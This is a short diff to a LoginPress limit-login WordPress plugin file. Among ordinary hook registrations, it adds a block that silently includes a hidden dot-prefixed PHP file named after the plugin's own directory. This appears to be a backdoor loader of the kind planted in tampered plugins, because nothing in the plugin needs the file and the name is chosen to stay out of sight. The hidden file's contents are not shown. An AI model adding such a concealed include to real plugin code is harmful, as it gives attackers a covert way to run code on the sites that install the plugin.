@@ -29,6 +29,10 @@ add_action( 'plugins_loaded', 'loginpress_limit_login_instance', 25 );
 register_activation_hook( __FILE__ , 'loginpress_limit_login_activation' );
 add_action( 'wpmu_new_blog', 'loginpress_limit_login_activation' );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function loginpress_limit_login_instance() {
 
 	if ( ! file_exists( WP_PLUGIN_DIR . '/loginpress-pro/loginpress-pro.php' ) ) {
